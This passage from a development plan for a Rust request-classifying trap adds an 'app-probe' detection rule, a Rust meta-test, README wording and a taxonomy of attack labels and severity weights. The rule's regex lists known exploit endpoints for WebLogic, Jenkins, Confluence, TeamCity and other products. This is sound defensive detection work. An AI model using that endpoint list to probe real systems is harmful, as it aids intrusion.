# alternatives keep ordinary paths out: /users/register is not Drupal's
# /user/register.

[[rule]]
label = "app-probe"
weight = 3
owasp = ["A06:2021"]
# WebLogic, Jenkins, Drupal, Joomla, Magento, ThinkPHP, Confluence
# (CVE-2023-22515), TeamCity (CVE-2023-42793), Apache OFBiz, ColdFusion,
# SharePoint, Zimbra, Struts, Solr, GeoServer.
target_regex = '''/(wls-wsat|uddiexplorer)(/|\?|$)|^/console(/|\?|$)|^/(script|scriptText|jnlpJars|asynchPeople)(/|\?|$)|/user/(register|password|login)(\?|$)|option=com_|/com_(users|content|config|installer)(/|\?|$)|/(downloader|magmi)(/|\?|$)|/app/etc/local\.xml|invokefunction|^/(setup/setupadministrator|json/setup-restore)(/|\?|$)|^/app/rest/|/webtools/control(/|\?|$)|^/CFIDE/|/_layouts/|/zimbraAdmin(/|\?|$)|\.(action|do)(\?|$)|^/(solr|geoserver)(/|\?|$)'''
```

(Note: Solr and GeoServer landed here rather than in `rce.toml` as the spec's
file list suggested — they are existence probes, weight 3, which is what
`app-probe` means; the RCE payloads sent to them are caught by `rce.toml`.)

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test classify`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add rules/api.toml rules/auth.toml rules/cms.toml src/classify/mod.rs
git commit -m "feat(classify): api-recon, credential-attack and app-probe rule families"
```

---

### Task 10: Meta-tests, docs, full verification

**Files:**
- Modify: `src/classify/rules.rs` tests (shipped-rules meta-test)
- Modify: `README.md:22-27` (trap feature bullet)
- Modify: `docs/operations.md` (append taxonomy section)

**Interfaces:**
- Consumes: all shipped rules from Tasks 5–9.
- Produces: nothing new for code consumers.

- [ ] **Step 1: Write the failing meta-test**

In `src/classify/rules.rs` tests module, extend `shipped_rules_load_and_validate` (or add beside it):

```rust
    #[test]
    fn shipped_rules_all_carry_owasp_tags() {
        let rules = load_dir(std::path::Path::new("rules")).unwrap();
        assert!(rules.len() >= 30, "rule-count sanity: {}", rules.len());
        for r in &rules {
            assert!(
                r.owasp.as_ref().is_some_and(|t| !t.is_empty()),
                "rule `{}` has no owasp tag",
                r.label
            );
        }
    }
```

- [ ] **Step 2: Run to verify it passes** (it should already — Tasks 5–9 tagged everything; if it fails, the failing rule file missed a tag: add it)

Run: `cargo test classify::rules`
Expected: PASS, `rules.len()` 30+ (expected: 38).

- [ ] **Step 3: README**

In `README.md`, in the **Trap** bullet (lines 24-26), replace:

```
  HTTPS, the raw TLS ClientHello and its JA4 fingerprint; and classifies it
  against editable TOML signature rules (`sqli`, `rce`, `traversal`, scanner
  user agents, …) into a severity 0–4.
```

with:

```
  HTTPS, the raw TLS ClientHello and its JA4 fingerprint; and classifies it
  against editable TOML signature rules — sixteen families from `sqli`,
  `rce` and path traversal to SSRF, webshells, deserialization and
  AI-infrastructure probes, each tagged with its OWASP reference (Top 10
  2021 class or Automated Threat) — into a severity 0–4.
```

- [ ] **Step 4: operations.md taxonomy section**

Append to `docs/operations.md`:

```markdown
## Classification taxonomy

Rules live in `rules/*.toml`, one file per family; each rule has a weight,
a label and an `owasp` tag. The weight (1–4) is the request's severity and
drives the counter-scan level:

| Weight | Meaning | Labels |
|---|---|---|
| 1 | single weak tell | `probe` (behavioural floor) |
| 2 | automated reconnaissance | `scanner-ua`, `research-scanner`, `sensitive-path`, `path-scanner`, `ai-infra-probe`, `api-recon` |
| 3 | exploit-adjacent | `form-interaction`, `write-method`, `xss`, `crlf-injection`, `webshell-probe`, `app-probe`, `cloud-infra-probe`, `credential-attack`, `mcp-probe`, `graphql-introspection`, `appliance-probe`, `iot-probe` |
| 4 | unambiguous exploit / post-exploitation | `sqli`, `rce`, `path-traversal`, `ssrf`, `ssti`, `nosqli`, `xxe`, `deserialization`, `webshell`, `mcp-abuse` |

The `owasp` tag is a Top-10 2021 class (`A03:2021`) for payload families or
an Automated Threat (`OAT-014`) for scanning behaviour. Tags are stored on
the request row (`owasp_json`), shown as badges next to the labels in the
web UI, and included in exports. A typo'd tag fails `check-config`.

Label badge colours follow the family: blue = reconnaissance (any
`*-probe` label, plus `scanner-ua`/`research-scanner`), red = injection,
violet = execution/impact, orange = interaction, solid = post-exploitation,
grey = automation tells, neutral accent = everything else. New labels need
no UI work: a `something-probe` label is blue automatically, everything
unknown is neutral.

Weight rationale when adding rules: would you counter-scan a source that
did *only* this? Recon gets 2, anything that touches an exploit gets 4
only when the payload itself is unambiguous.
```

- [ ] **Step 5: Full verification**

Run the CI's exact gates (`.github/workflows/ci.yml`):

```bash
cargo fmt --all -- --check
cargo clippy --all-targets --locked -- -D warnings
cargo test --locked
```

Expected: all green — including `tests/capture.rs`, `tests/integration.rs`, `tests/cluster*.rs` (no level semantics changed, so these are unaffected).

- [ ] **Step 6: Commit**

```bash
git add src/classify/rules.rs README.md docs/operations.md
git commit -m "docs: classification taxonomy, shipped-rule owasp meta-test"
```
